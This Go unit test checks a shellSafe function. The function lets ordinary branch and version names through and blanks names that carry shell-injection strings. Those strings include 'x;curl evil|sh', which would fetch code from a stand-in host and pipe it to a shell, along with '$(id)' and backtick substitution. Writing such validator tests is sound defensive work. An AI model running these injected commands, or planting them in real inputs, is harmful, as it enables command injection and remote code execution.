// SPDX-FileCopyrightText: 2026 The Kogge authors
// SPDX-License-Identifier: EUPL-1.2

package builds

import "testing"

func TestShellSafe(t *testing.T) {
	for name, want := range map[string]string{
		"main": "main", "release/2.1": "release/2.1", "feature/größe": "feature/größe", "v1.0.0-rc.1+build": "v1.0.0-rc.1+build",
		"x;curl evil|sh": "", "$(id)": "", "`id`": "", "a'b": "", `a"b`: "", "fix(ui)": "", "a&b": "", "a\x01b": "", "{a,b}": "",
	} {
		if got := shellSafe(name); got != want {
			t.Errorf("shellSafe(%q) = %q, want %q", name, got, want)
		}
	}
}
